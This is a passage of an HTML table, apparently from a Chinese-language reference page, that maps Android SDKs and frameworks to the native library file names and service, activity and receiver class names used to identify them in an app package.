Lite</td><td>libtensorflowlite_jni.so</td></tr><tr><td>glog</td><td>libglog.so</td></tr><tr><td>银联 SDK</td><td>libuptsmaddonmi.so</td></tr><tr><td>IJKPlayer</td><td>libijkplayer.so</td></tr><tr><td>Yoga</td><td>libyouga.so</td></tr><tr><td>腾讯云 HTTPDNS</td><td>libhttpdns.so</td></tr><tr><td>AndroLua</td><td>libluajava.so</td></tr><tr><td>阿里聚安全</td><td>libsgmain.so</td></tr><tr><td>HUAWEI AR Engine</td><td>libhuawei_arengine_jni.so</td></tr><tr><td>Unity</td><td>libmain.so</td></tr><tr><td>阿里聚安全</td><td>libsgavmp.so</td></tr><tr><td>Weex</td><td>libweexcore.so</td></tr><tr><td>腾讯云短视频 SDK</td><td>libtxsdl.so</td></tr><tr><td>Xamarin</td><td>libmonodroid_bundle_app.so</td></tr><tr><td>RenderScript</td><td>librsjni_androidx.so</td></tr><tr><td>React Native</td><td>libreactnativeblob.so</td></tr><tr><td>梆梆安全</td><td>libdexjni.so</td></tr><tr><td>Flutter</td><td>libapp.so</td></tr><tr><td>Weex</td><td>libweexjsb.so</td></tr><tr><td>岳鹰 SDK</td><td>libcrashsdk.so</td></tr><tr><td>环信 IM</td><td>libhyphenate.so</td></tr><tr><td>小爱 SDK</td><td>libmibraindec.so</td></tr><tr><td>MSA SDK</td><td>libA3AEECD8.so</td></tr><tr><td>IJKPlayer</td><td>libijkffmpeg.so</td></tr><tr><td>阿里聚安全</td><td>libsgsgmiddletier.so</td></tr><tr><td>MSA SDK</td><td>lib39285EFA.so</td></tr><tr><td>小米游戏 SDK</td><td>libconnectionbase.so</td></tr><tr><td>MSA SDK</td><td>libsecsdk.so</td></tr><tr><td>ARCore</td><td>libarcore_sdk_jni.so</td></tr><tr><td>React Native</td><td>libreactnative.so</td></tr><tr><td>腾讯移动分析</td><td>libMtaNativeCrash.so</td></tr><tr><td>微博 SDK</td><td>libweibosdkcore.so</td></tr><tr><td>Xamarin</td><td>libmonodroid.so</td></tr><tr><td>Weex</td><td>libweexjst.so</td></tr><tr><td>Xamarin</td><td>libaot-mscorlib.dll.so</td></tr><tr><td>高德 SDK</td><td>libapssdk.so</td></tr><tr><td>ViroCore</td><td>libarcore_sdk_c.so</td></tr><tr><td>腾讯地图 SDK</td><td>libtxmapengine.so</td></tr><tr><td>Bmob 后端云</td><td>libbmob.so</td></tr><tr><td>梆梆安全</td><td>libSecShell.so</td></tr><tr><td>Pangle SDK</td><td>libbuffer_pg.so</td></tr><tr><td>React Native</td><td>libJavaScriptCore.so</td></tr><tr><td>微博 SDK</td><td>libwind.so</td></tr><tr><td>uCrop</td><td>libucrop.so</td></tr><tr><td>Flutter</td><td>libflutter.so</td></tr><tr><td>融云 IM</td><td>libRongIMLib.so</td></tr><tr><td>Fresco</td><td>libbitmaps.so</td></tr><tr><td>wgs2gcj</td><td>libJni_wgs2gcj.so</td></tr><tr><td>Bugsnag</td><td>libbugsnag-plugin-android-anr.so</td></tr><tr><td>realm</td><td>librealm-jni.so</td></tr><tr><td>OpenCV</td><td>libopencv_java3.so</td></tr><tr><td>BoostMultiDex</td><td>libboost_multidex.so</td></tr><tr><td>libchrome</td><td>libchrome.so</td></tr><tr><td>React Native</td><td>libglog_init.so</td></tr><tr><td>OpenSSL</td><td>libopenssl.so</td></tr><tr><td>android-gif-drawable</td><td>libpl_droidsonroids_gif.so</td></tr><tr><td>极光认证 SDK</td><td>libCtaApiLib.so</td></tr><tr><td>个推</td><td>libgetuiext3.so</td></tr><tr><td>Unity</td><td>libunity.so</td></tr><tr><td>腾讯流量联盟</td><td>libBeacon.so</td></tr><tr><td>Fresco</td><td>libgifimage.so</td></tr><tr><td>React Native</td><td>libjsc.so</td></tr><tr><td>Xamarin</td><td>libmonosgen-2.0.so</td></tr><tr><td>小爱 SDK</td><td>libmibrainjni.so</td></tr><tr><td>MMKV</td><td>libmmkv.so</td></tr><tr><td>Weex</td><td>libweexjssr.so</td></tr><tr><td>梆梆安全</td><td>libSecShell-x86.so</td></tr><tr><td>腾讯云短视频 SDK</td><td>libliteavsdk.so</td></tr><tr><td>IJKPlayer</td><td>libijksdl.so</td></tr><tr><td>Bugsnag</td><td>libbugsnag-ndk.so</td></tr><tr><td>GCanvas</td><td>libgcanvas.so</td></tr><tr><td>百度 LBS</td><td>libindoor.so</td></tr><tr><td>HUAWEI AR Engine</td><td>libhuawei_arengine_ndk.so</td></tr><tr><td>C++ 共享库</td><td>libgnustl_shared.so</td></tr><tr><td>小米游戏 SDK</td><td>libmilinkconnection.so</td></tr><tr><td>C++ 共享库</td><td>libc++_shared.so</td></tr><tr><td>Weex</td><td>libWTF.so</td></tr><tr><td>PLDroidPlayer</td><td>libQPlayer.so</td></tr><tr><td>阿里聚安全</td><td>libsgsecuritybody.so</td></tr><tr><td>Pangle SDK</td><td>libtobEmbedEncrypt.so</td></tr><tr><td>银联 SDK</td><td>libuptsmaddon.so</td></tr><tr><td>银联 SDK</td><td>libuptsmservice.so</td></tr><tr><td>React Native</td><td>libreactnativejni.so</td></tr><tr><td>React Native</td><td>libjscexecutor.so</td></tr><tr><td>小爱 SDK</td><td>libmibrainvad2.so</td></tr><tr><td>WCDB</td><td>libwcdb.so</td></tr><tr><td>360 加固</td><td>libjiagu.so</td></tr><tr><td>腾讯云短视频 SDK</td><td>libtxffmpeg.so</td></tr><tr><td>TRTC SDK</td><td>libtraeimp-rtmp.so</td></tr><tr><td>银联 SDK</td><td>libentryexpro.so</td></tr><tr><td>SQLCipher</td><td>libstlport_shared.so</td></tr><tr><td>libYUV</td><td>libYUV.so</td></tr><tr><td>Fresco</td><td>libstatic-webp.so</td></tr><tr><td>Ping++</td><td>libpingpp.so</td></tr><tr><td>Xamarin</td><td>libxamarin-app.so</td></tr><tr><td>梆梆安全</td><td>libDexHelper.so</td></tr><tr><td>libYUV</td><td>libyuv.so</td></tr><tr><td>信鸽推送</td><td>libtpnsSecurity.so</td></tr><tr><td>Unity</td><td>libmono.so</td></tr><tr><td>烈焰弹幕使</td><td>libndkbitmap.so</td></tr><tr><td>MNN</td><td>libMNN.so</td></tr><tr><td>腾讯地图 SDK</td><td>libtencentloc.so</td></tr><tr><td>MNN</td><td>libMNN_Express.so</td></tr><tr><td>xCrash</td><td>libxcrash_dumper.so</td></tr><tr><td>FrameSequence</td><td>libframesequence.so</td></tr><tr><td>Xamarin</td><td>libmono-btls-shared.so</td></tr><tr><td>FreeType</td><td>libfreetype.so</td></tr><tr><td>TDLib</td><td>libtdjni.so</td></tr><tr><td>Fresco</td><td>libmemchunk.so</td></tr><tr><td>梆梆安全</td><td>libDexHelper-x86.so</td></tr><tr><td>腾讯移动分析</td><td>libmtanativecrash_v2.so</td></tr><tr><td>React Native</td><td>libfolly_json.so</td></tr><tr><td>微博 SDK</td><td>libutility.so</td></tr><tr><td>Weex</td><td>libWeexEagle.so</td></tr><tr><td>LAME</td><td>libmp3lame.so</td></tr><tr><td>腾讯云通信 SDK</td><td>libqalmsfboot.so</td></tr><tr><td>Crashlytics</td><td>libcrashlytics.so</td></tr><tr><td>Unreal Engine</td><td>libUE4.so</td></tr><tr><td>Xamarin</td><td>libmono-native.so</td></tr><tr><td>Golang</td><td>libgojni.so</td></tr><tr><td>Epic</td><td>libepic.so</td></tr><tr><td>RenderScript</td><td>librsjni.so</td></tr><tr><td>米大师</td><td>libwtecdh.so</td></tr><tr><td>讯飞 SDK</td><td>libmsc.so</td></tr><tr><td>腾讯云通信 SDK</td><td>libwtcrypto.so</td></tr><tr><td>HardCoder</td><td>libhardcoder.so</td></tr><tr><td>Fresco</td><td>libwebp.so</td></tr><tr><td>腾讯云通信 SDK</td><td>libImSDK.so</td></tr><tr><td>AndFix</td><td>libandfix_x86.so</td></tr><tr><td>RenderScript</td><td>libRSSupport.so</td></tr><tr><td>Agora RTC SDK</td><td>libagora-rtc-sdk-jni.so</td></tr><tr><td>Hippy</td><td>libhippybridge.so</td></tr><tr><td>小爱 SDK</td><td>libmibrainsdk.so</td></tr><tr><td>梆梆安全</td><td>libsecexe.so</td></tr><tr><td>Pangle SDK</td><td>libnms.so</td></tr><tr><td>Hippy</td><td>libflexbox.so</td></tr><tr><td>高德地图 SDK</td><td>libAMapSDK_MAP_v(.*).so</td></tr><tr><td>Xamarin</td><td>libaot-Xamarin.Android.(.*).dll.so</td></tr><tr><td>Cronet</td><td>libcronet.(.*).so</td></tr><tr><td>百川 SDK</td><td>libcocklogic-(.*).so</td></tr><tr><td>百度云推送</td><td>libbdpush_V(.*).so</td></tr><tr><td>极光推送</td><td>libjcore(.*).so</td></tr><tr><td>libtnet</td><td>libtnet-(.*).so</td></tr><tr><td>阿里聚安全</td><td>libsgavmpso-(.*).so</td></tr><tr><td>阿里聚安全</td><td>libsgsecuritybodyso-(.*).so</td></tr><tr><td>阿里聚安全</td><td>libsgsgmiddletierso-(.*).so</td></tr><tr><td>百度地图 SDK</td><td>libBaiduMapSDK_v(.*).so</td></tr><tr><td>百度地图 SDK</td><td>libBaiduMapSDK_base_v(.*).so</td></tr><tr><td>百度地图 SDK</td><td>libBaiduMapSDK_map_v(.*).so</td></tr><tr><td>百度地图 SDK</td><td>liblocSDK(.*)[0-9]a.so</td></tr><tr><td>腾讯乐固</td><td>libshell-super(.*).so</td></tr><tr><td>腾讯乐固</td><td>libshella-(.*).so</td></tr><tr><td>MiPush</td><td>com.xiaomi.mipush.sdk.MessageHandleService</td></tr><tr><td>MiPush</td><td>com.xiaomi.mipush.sdk.PushMessageHandler</td></tr><tr><td>HUAWEI Push</td><td>com.huawei.hms.support.api.push.service.HmsMsgService</td></tr><tr><td>Jetpack Room</td><td>androidx.room.MultiInstanceInvalidationService</td></tr><tr><td>Google Sign-In</td><td>com.google.android.gms.auth.api.signin.RevocationBoundService</td></tr><tr><td>友盟推送</td><td>com.umeng.message.UmengService</td></tr><tr><td>快应用</td><td>org.hapjs.(.*)</td></tr><tr><td>Google Cast</td><td>com.google.android.gms.cast.framework.ReconnectionService</td></tr><tr><td>Mtop SDK</td><td>mtopsdk.xstate.XStateService</td></tr><tr><td>百度云推送</td><td>com.baidu.android.pushservice.HmsPushPatchMessageService</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.tpns.mqttchannel.services.MqttService</td></tr><tr><td>MiPush</td><td>com.xiaomi.push.service.XMJobService</td></tr><tr><td>Matrix</td><td>com.tencent.matrix.resource.CanaryWorkerService</td></tr><tr><td>阿里移动推送</td><td>com.alibaba.sdk.android.push.channel.KeepChannelService</td></tr><tr><td>Firebase</td><td>com.google.firebase.components.ComponentDiscoveryService</td></tr><tr><td>AppGallery Connect</td><td>com.huawei.agconnect.core.ServiceDiscovery</td></tr><tr><td>BoostMultiDex</td><td>com.bytedance.boost_multidex.OptimizeService</td></tr><tr><td>Android-Job</td><td>com.evernote.android.job.JobRescheduleService</td></tr><tr><td>Firebase</td><td>com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService</td></tr><tr><td>阿里移动推送</td><td>com.taobao.accs.data.MsgDistributeService</td></tr><tr><td>TBS</td><td>com.tencent.smtt.export.external.DexClassLoaderProviderService</td></tr><tr><td>Google Cast</td><td>com.google.android.gms.cast.framework.media.MediaNotificationService</td></tr><tr><td>OPPO Push</td><td>com.coloros.mcssdk.PushService</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.downloader.DownloadService</td></tr><tr><td>快手广告 SDK</td><td>com.ksad.download.service.DownloadService</td></tr><tr><td>Firebase</td><td>com.google.android.datatransport.runtime.backends.TransportBackendDiscovery</td></tr><tr><td>OPPO Push</td><td>com.heytap.msp.push.service.DataMessageCallbackService</td></tr><tr><td>VirtualAPK</td><td>com.didi.virtualapk.delegate.RemoteService</td></tr><tr><td>友盟推送</td><td>com.umeng.message.UmengMessageCallbackHandlerService</td></tr><tr><td>FileDownloader</td><td>com.liulishuo.filedownloader.services.FileDownloadService$SeparateProcessService</td></tr><tr><td>阿里移动推送</td><td>com.taobao.agoo.TaobaoMessageIntentReceiverService</td></tr><tr><td>FCM</td><td>com.google.firebase.messaging.FirebaseMessagingService</td></tr><tr><td>友盟推送</td><td>com.umeng.update.net.DownloadingService</td></tr><tr><td>Meizu Push</td><td>com.meizu.cloud.pushsdk.NotificationService</td></tr><tr><td>腾讯云通信</td><td>com.tencent.qalsdk.service.QalAssistService</td></tr><tr><td>OPPO Push</td><td>com.heytap.mcssdk.AppPushService</td></tr><tr><td>友盟推送</td><td>com.umeng.message.XiaomiIntentService</td></tr><tr><td>阿里移动推送</td><td>com.alibaba.sdk.android.push.channel.TaobaoRecvService</td></tr><tr><td>Android-Job</td><td>com.evernote.android.job.v14.PlatformAlarmService</td></tr><tr><td>Android-Job</td><td>com.evernote.android.job.v21.PlatformJobService</td></tr><tr><td>阿里移动推送</td><td>com.alibaba.sdk.android.push.channel.CheckService</td></tr><tr><td>网易云通信 SDK</td><td>com.netease.nimlib.job.NIMJobService</td></tr><tr><td>信鸽推送</td><td>com.tencent.android.tpush.service.XGDaemonService</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.background.systemjob.SystemJobService</td></tr><tr><td>阿里移动推送</td><td>com.taobao.accs.internal.AccsJobService</td></tr><tr><td>Android-Job</td><td>com.evernote.android.job.v14.PlatformAlarmServiceExact</td></tr><tr><td>百度云推送</td><td>com.baidu.android.pushservice.PushService</td></tr><tr><td>Firebase Analytics</td><td>com.google.android.gms.measurement.AppMeasurementJobService</td></tr><tr><td>阿里移动推送</td><td>com.taobao.accs.ChannelService</td></tr><tr><td>Matrix</td><td>com.tencent.matrix.resource.CanaryResultService</td></tr><tr><td>Tinker</td><td>com.tencent.tinker.lib.service.TinkerPatchService</td></tr><tr><td>阿里移动推送</td><td>com.alibaba.sdk.android.push.AliyunPushIntentService</td></tr><tr><td>百度地图 SDK</td><td>com.baidu.location.f</td></tr><tr><td>HUAWEI Push</td><td>com.huawei.updatesdk.service.deamon.download.DownloadService</td></tr><tr><td>Bugly</td><td>com.tencent.bugly.beta.tinker.TinkerResultService</td></tr><tr><td>信鸽推送</td><td>com.tencent.android.tpush.service.XGPushService</td></tr><tr><td>阿里移动推送</td><td>com.alibaba.sdk.android.push.MsgService</td></tr><tr><td>Weex</td><td>com.alibaba.android.bindingx.plugin.weex.WXBindingXModuleService</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.PushService</td></tr><tr><td>MiPush</td><td>com.xiaomi.push.service.XMPushService</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.comm.DownloadService</td></tr><tr><td>高德地图 SDK</td><td>com.amap.api.location.APSService</td></tr><tr><td>腾讯云通信</td><td>com.tencent.qalsdk.service.QalService</td></tr><tr><td>友盟推送</td><td>com.umeng.message.UmengDownloadResourceService</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.android.app.MspService</td></tr><tr><td>Tinker</td><td>com.tencent.tinker.lib.service.TinkerPatchService<img src="https://www.yuque.com/api/services/graph/generate_redirect/latex?IntentServiceRunner" alt="img">InnerService</td></tr><tr><td>百度云推送</td><td>com.baidu.android.pushservice.CommandService</td></tr><tr><td>PCDN SDK</td><td>com.edge.pcdn.PcdnLiveService</td></tr><tr><td>网易云通信 SDK</td><td>com.netease.nimlib.service.NimService$Aux</td></tr><tr><td>Firebase Analytics</td><td>com.google.android.gms.measurement.AppMeasurementService</td></tr><tr><td>Google Analytics</td><td>com.google.android.gms.analytics.AnalyticsJobService</td></tr><tr><td>Tinker</td><td>com.tencent.tinker.lib.service.TinkerPatchService$InnerService</td></tr><tr><td>网易云通信 SDK</td><td>com.netease.nimlib.service.ResponseService</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.tea.crash.upload.CrashUploadService</td></tr><tr><td>AndroidUtilCode</td><td>com.blankj.utilcode.util.MessengerUtils$ServerService</td></tr><tr><td>Google Analytics</td><td>com.google.android.gms.analytics.AnalyticsService</td></tr><tr><td>PCDN SDK</td><td>com.edge.pcdn.PcdnVodService</td></tr><tr><td>Firebase</td><td>com.google.firebase.iid.FirebaseInstanceIdService</td></tr><tr><td>信鸽推送</td><td>com.tencent.android.tpush.service.XGPushServiceV4</td></tr><tr><td>信鸽推送</td><td>com.tencent.android.tpush.service.XGPushServiceV3</td></tr><tr><td>VirtualAPK</td><td>com.didi.virtualapk.delegate.LocalService</td></tr><tr><td>网易云通信 SDK</td><td>com.netease.nimlib.service.NimService</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.service.XGVipPushService</td></tr><tr><td>友盟推送</td><td>com.umeng.message.UmengIntentService</td></tr><tr><td>vivo Push</td><td>com.vivo.push.sdk.service.CommandClientService</td></tr><tr><td>阿里移动推送</td><td>com.taobao.accs.ChannelService$KernelService</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.DownloadService</td></tr><tr><td>百度云推送</td><td>com.baidu.android.pushservice.job.PushJobService</td></tr><tr><td>Tinker</td><td>com.tencent.tinker.lib.service.TinkerPatchForeService</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.foreground.SystemForegroundService</td></tr><tr><td>个推</td><td>com.igexin.sdk.PushService</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.DaemonService</td></tr><tr><td>AndPermission</td><td>com.yanzhenjie.permission.bridge.BridgeService</td></tr><tr><td>OPPO Push</td><td>com.heytap.mcssdk.PushService</td></tr><tr><td>FileDownloader</td><td>com.liulishuo.filedownloader.services.FileDownloadService$SharedMainProcessService</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.rpc.XGRemoteService</td></tr><tr><td>招商银行 SDK</td><td>cmb.pb.cmbsafe.CmbService</td></tr><tr><td>Tinker</td><td>com.tencent.tinker.lib.service.DefaultTinkerResultService</td></tr><tr><td>阿里移动推送</td><td>org.android.agoo.accs.AgooService</td></tr><tr><td>友盟推送</td><td>com.umeng.message.UmengMessageIntentReceiverService</td></tr><tr><td>OPPO Push</td><td>com.heytap.msp.push.service.CompatibleDataMessageCallbackService</td></tr><tr><td>RePlugin</td><td>com.qihoo360.replugin.component.service.server.PluginPitService(.*)</td></tr><tr><td>Pangle SDK</td><td>com.ss.android.socialbase.(.*)</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.sdk.openadsdk.(.*)</td></tr><tr><td>米大师</td><td>com.tencent.midas.wx.APMidasWXPayActivity</td></tr><tr><td>腾讯开放平台</td><td>com.tencent.connect.common.AssistActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.ads.RewardvideoLandscapeADActivity</td></tr><tr><td>腾讯开放平台</td><td>com.tencent.tauth.AuthActivity</td></tr><tr><td>快手广告 SDK</td><td>com.kuaishou.commercial.downloader.center.AdDownloadCenterV2Activity</td></tr><tr><td>银联 SDK</td><td>com.unionpay.uppay.PayActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.ads.PortraitADActivity</td></tr><tr><td>HMS Update</td><td>com.huawei.updatesdk.service.otaupdate.AppUpdateActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.ads.LandscapeADActivity</td></tr><tr><td>个推</td><td>com.igexin.sdk.GActivity</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.sdk.app.H5PayActivity</td></tr><tr><td>vivo Push</td><td>com.vivo.push.sdk.LinkProxyClientActivity</td></tr><tr><td>AndroidUtilCode</td><td>com.blankj.utilcode.util.UtilsTransActivity</td></tr><tr><td>TBS</td><td>com.tencent.smtt.sdk.VideoActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.ads.ADActivity</td></tr><tr><td>支付宝 SDK</td><td>com.ali.auth.third.ui.LoginWebViewActivity</td></tr><tr><td>支付宝 SDK</td><td>com.ali.auth.third.ui.LoginActivity</td></tr><tr><td>百度云推送</td><td>com.baidu.android.pushservice.hwproxy.HwNotifyActivity</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.sdk.app.H5OpenAuthActivity</td></tr><tr><td>Weex</td><td>com.taobao.weex.WXGlobalEventReceiver</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.sdk.app.AlipayResultActivity</td></tr><tr><td>HMS Core</td><td>com.huawei.hms.activity.EnableServiceActivity</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.JNotifyActivity</td></tr><tr><td>移动号码认证</td><td>com.cmic.sso.sdk.activity.LoginAuthActivity</td></tr><tr><td>Google AdMob</td><td>com.google.android.gms.ads.AdActivity</td></tr><tr><td>EasyPermissions</td><td>pub.devrel.easypermissions.AppSettingsDialogHolderActivity</td></tr><tr><td>HUAWEI Ads Kit</td><td>com.huawei.openalliance.ad.activity.PPSLauncherActivity</td></tr><tr><td>AndPermission</td><td>com.yanzhenjie.permission.PermissionActivity</td></tr><tr><td>HMS Core</td><td>com.huawei.android.hms.agent.hwid.HMSSignInAgentActivity</td></tr><tr><td>HUAWEI DTM</td><td>com.huawei.hms.dtm.PreviewActivity</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.web.WeiboSdkWebActivity</td></tr><tr><td>ARCore</td><td>com.google.ar.core.InstallActivity</td></tr><tr><td>腾讯移动推送</td><td>com.tencent.android.tpush.TpnsActivity</td></tr><tr><td>支付宝 SDK</td><td>com.ali.auth.third.ui.webview.BaseWebViewActivity</td></tr><tr><td>HMS Update</td><td>com.huawei.updatesdk.support.pm.PackageInstallerActivity</td></tr><tr><td>阿里聚安全</td><td>com.alibaba.wireless.security.open.middletier.fc.ui.ContainerActivity</td></tr><tr><td>腾讯广告 SDK</td><td>com.qq.e.ads.RewardvideoPortraitADActivity</td></tr><tr><td>Facebook SDK</td><td>com.facebook.FacebookActivity</td></tr><tr><td>android-crop</td><td>com.soundcloud.android.crop.CropImageActivity</td></tr><tr><td>AppAuth</td><td>net.openid.appauth.RedirectUriReceiverActivity</td></tr><tr><td>Facebook SDK</td><td>com.facebook.CustomTabMainActivity</td></tr><tr><td>极光推送</td><td>cn.jpush.android.ui.PushActivity</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.sdk.app.PayResultActivity</td></tr><tr><td>AndroidUtilCode</td><td>com.blankj.utilcode.util.UtilsTransActivity4MainProcess</td></tr><tr><td>银联 SDK</td><td>com.unionpay.UPPayWapActivity</td></tr><tr><td>React Native</td><td>com.facebook.react.devsupport.DevSettingsActivity</td></tr><tr><td>个推</td><td>com.igexin.sdk.PushActivity</td></tr><tr><td>AndPermission</td><td>com.yanzhenjie.permission.bridge.BridgeActivity</td></tr><tr><td>AppAuth</td><td>net.openid.appauth.AuthorizationManagementActivity</td></tr><tr><td>小米账号开放平台</td><td>com.xiaomi.account.openauth.AuthorizeActivity</td></tr><tr><td>Google Play Service</td><td>com.google.android.gms.common.api.GoogleApiActivity</td></tr><tr><td>Ping++</td><td>com.pingplusplus.android.PaymentActivity</td></tr><tr><td>翼支付</td><td>com.bestpay.app.H5PayActivity</td></tr><tr><td>移动应用推广 SDK</td><td>com.baidu.mobads.AppActivity</td></tr><tr><td>Matisse</td><td>com.zhihu.matisse.internal.ui.SelectedPreviewActivity</td></tr><tr><td>Google Sign-In</td><td>com.google.android.gms.auth.api.signin.internal.SignInHubActivity</td></tr><tr><td>Matisse</td><td>com.zhihu.matisse.internal.ui.AlbumPreviewActivity</td></tr><tr><td>阿里移动推送</td><td>com.alibaba.sdk.android.push.keeplive.PushExtActivity</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.component.WeiboSdkBrowser</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.share.WbShareToStoryActivity</td></tr><tr><td>快应用</td><td>org.hapjs.(.*)</td></tr><tr><td>Facebook SDK</td><td>com.facebook.CustomTabActivity</td></tr><tr><td>uCrop</td><td>com.yalantis.ucrop.UCropActivity</td></tr><tr><td>米大师</td><td>com.tencent.midas.proxyactivity.APMidasPayProxyActivity</td></tr><tr><td>Bugly</td><td>com.tencent.bugly.beta.ui.BetaActivity</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.share.WbShareResultActivity</td></tr><tr><td>U-Share</td><td>com.umeng.socialize.media.WBShareCallBackActivity</td></tr><tr><td>Jetpack Slice</td><td>androidx.slice.compat.SlicePermissionActivity</td></tr><tr><td>HMS Core</td><td>com.huawei.android.hms.agent.common.HMSAgentActivity</td></tr><tr><td>Google Play Billing</td><td>com.android.billingclient.api.ProxyBillingActivity</td></tr><tr><td>HMS Core</td><td>com.huawei.android.hms.agent.pay.HMSPayAgentActivity</td></tr><tr><td>微博 SDK</td><td>com.sina.weibo.sdk.share.WbShareTransActivity</td></tr><tr><td>Matisse</td><td>com.zhihu.matisse.ui.MatisseActivity</td></tr><tr><td>防水墙</td><td>com.tencent.captchasdk.TCaptchaPopupActivity</td></tr><tr><td>HMS Core</td><td>com.huawei.hms.activity.BridgeActivity</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.sdk.auth.AuthActivity</td></tr><tr><td>极光推送</td><td>cn.jpush.android.ui.PopWinActivity</td></tr><tr><td>Unity</td><td>com.unity3d.player.UnityPlayerActivity</td></tr><tr><td>uCrop</td><td>com.yalantis.ucrop.PictureMultiCuttingActivity</td></tr><tr><td>支付宝 SDK</td><td>com.alipay.sdk.app.H5AuthActivity</td></tr><tr><td>招商银行 SDK</td><td>cmb.pb.ui.PBKeyboardActivity</td></tr><tr><td>Tinker</td><td>com.tencent.tinker.loader.hotplug.ActivityStubs(.*)</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.sdk.openadsdk.(.*)</td></tr><tr><td>Pangle SDK</td><td>com.ss.android.socialbase.appdownloader.(.*)</td></tr><tr><td>Pangle SDK</td><td>com.ss.android.downloadlib.(.*)</td></tr><tr><td>Pangle SDK</td><td>com.yxcorp.gifshow.ad(.*)</td></tr><tr><td>Pangle SDK</td><td>com.yxcorp.map.advertisement.(.*)</td></tr><tr><td>Meizu Push(GeTui Proxy)</td><td>com.igexin.sdk.FlymePushReceiver</td></tr><tr><td>Google Analytics</td><td>com.google.android.gms.analytics.AnalyticsReceiver</td></tr><tr><td>HUAWEI Push</td><td>com.huawei.hms.support.api.push.PushMsgReceiver</td></tr><tr><td>Pangle SDK</td><td>com.ss.android.downloadlib.core.download.DownloadReceiver</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.SchedulerReceiver</td></tr><tr><td>Firebase</td><td>com.google.firebase.iid.FirebaseInstanceIdReceiver</td></tr><tr><td>Pangle SDK</td><td>com.bytedance.embedapplog.collector.Collector</td></tr><tr><td>App Center</td><td>com.microsoft.appcenter.distribute.DownloadManagerReceiver</td></tr><tr><td>Firebase Analytics</td><td>com.google.android.gms.measurement.AppMeasurementReceiver</td></tr><tr><td>小米更新 SDK</td><td>com.market.sdk.DownloadCompleteReceiver</td></tr><tr><td>Android-Job</td><td>com.evernote.android.job.v14.PlatformAlarmReceiver</td></tr><tr><td>MiPush</td><td>com.xiaomi.push.service.receivers.NetworkStatusReceiver</td></tr><tr><td>个推</td><td>com.igexin.sdk.PushReceiver</td></tr><tr><td>HUAWEI Push</td><td>com.huawei.hms.support.api.push.PushReceiver</td></tr><tr><td>Meizu Push(TPNS Proxy)</td><td>com.tencent.android.mzpush.MZPushMessageReceiver</td></tr><tr><td>Android-Job</td><td>com.evernote.android.job.JobBootReceiver</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.background.systemalarm.RescheduleReceiver</td></tr><tr><td>Google Cast</td><td>com.google.android.gms.cast.framework.media.MediaIntentReceiver</td></tr><tr><td>阿里移动推送</td><td>com.alibaba.sdk.android.push.SystemEventReceiver</td></tr><tr><td>阿里移动推送</td><td>com.taobao.accs.ServiceReceiver</td></tr><tr><td>Jetpack Media</td><td>androidx.media.session.MediaButtonReceiver</td></tr><tr><td>Meizu Push(JPush Proxy)</td><td>cn.jpush.android.service.PluginMeizuPlatformsReceiver</td></tr><tr><td>MiPush(Aliyun Proxy)</td><td>org.android.agoo.xiaomi.MiPushBroadcastReceiver</td></tr><tr><td>极光推送</td><td>cn.jpush.android.service.PushReceiver</td></tr><tr><td>阿里移动推送</td><td>com.taobao.accs.EventReceiver</td></tr><tr><td>友盟推送</td><td>com.umeng.message.NotificationProxyBroadcastReceiver</td></tr><tr><td>个推</td><td>com.igexin.download.DownloadReceiver</td></tr><tr><td>vivo Push(Aliyun Proxy)</td><td>org.android.agoo.vivo.PushMessageReceiverImpl</td></tr><tr><td>MiPush(TPNS Proxy)</td><td>com.tencent.android.mipush.XMPushMessageReceiver</td></tr><tr><td>百度云推送</td><td>com.baidu.android.pushservice.RegistrationReceiver</td></tr><tr><td>网易云通信 SDK</td><td>com.netease.nimlib.service.NimReceiver</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.diagnostics.DiagnosticsReceiver</td></tr><tr><td>MiPush(JPush Proxy)</td><td>cn.jpush.android.service.PluginXiaomiPlatformsReceiver</td></tr><tr><td>Meizu Push</td><td>com.meizu.cloud.pushsdk.SystemReceiver</td></tr><tr><td>Jetpack WorkManager</td><td>androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver</td></tr><tr><td>Firebase</td><td>com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver</td></tr><tr><td>HUAWEI Push(GeTui Proxy)</td><td>com.igexin.sdk.HmsPushSubReceiver</td></tr><tr><td>HUAWEI Push</td><td>com.huawei.android.pushagent.PushBootReceiver</td></tr><tr><td>HUAWEI Push(Aliyun Proxy)</td><td>org.android.agoo.huawei.HuaweiPushReceiver</td></tr><tr><td>百度云推送</td><td>com.baidu.android.pushservice.PushServiceReceiver</td></tr><tr><td>Firebase Analytics</td><td>com.google.android.gms.measurement.AppMeasurementInstallReferrerReceiver</td></tr><tr><td>HUAWEI 